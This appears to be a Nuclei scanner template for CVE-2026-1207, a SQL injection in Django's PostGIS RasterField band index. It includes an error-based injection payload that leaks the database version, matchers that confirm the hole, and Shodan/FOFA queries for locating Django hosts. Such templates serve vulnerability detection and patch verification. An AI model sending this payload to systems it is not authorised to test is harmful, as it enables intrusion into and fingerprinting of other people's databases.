id: CVE-2026-1207

info:
  name: Django RasterField - SQL Injection
  author: omarkurt
  severity: high
  description: |
    SQL Injection vulnerability in Django 6.0 before 6.0.2, 5.2 before 5.2.11,
    and 4.2 before 4.2.28. RasterField lookups on PostGIS allow SQL injection
    via the band index parameter. The vulnerability exists because the band
    index parameter is concatenated directly into the SQL query without proper
    sanitization when using a GDALRaster as the right-hand side of a lookup.
  impact: |
    Attackers can read, modify, or delete database contents, potentially
    gaining full system access through SQL injection.
  remediation: |
    Upgrade to Django 6.0.2, 5.2.11, or 4.2.28.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-1207
    - https://www.djangoproject.com/weblog/2026/feb/03/security-releases/
    - https://github.com/django/django/commit/81aa5292967cd09319c45fe2c1a525ce7b6684d8
    - https://vulnerabletarget.com/VT-2026-1207
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
    cvss-score: 8.1
    cve-id: CVE-2026-1207
    cwe-id: CWE-89
    cpe: cpe:2.3:a:djangoproject:django:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: djangoproject
    product: django
    shodan-query: 'django'
    fofa-query: 'app="Django"'
  tags: cve,cve2026,django,sqli,postgis,rasterfield

http:
  - method: GET
    path:
      - "{{BaseURL}}/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "invalid input syntax for type integer"

      - type: regex
        part: body
        regex:
          - "PostgreSQL"
          - "django\\.db\\.utils"
        condition: or

      - type: status
        status:
          - 500

    extractors:
      - type: regex
        name: postgres_version
        part: body
        group: 1
        regex:
          - 'PostgreSQL ([0-9]+\\.[0-9]+)'
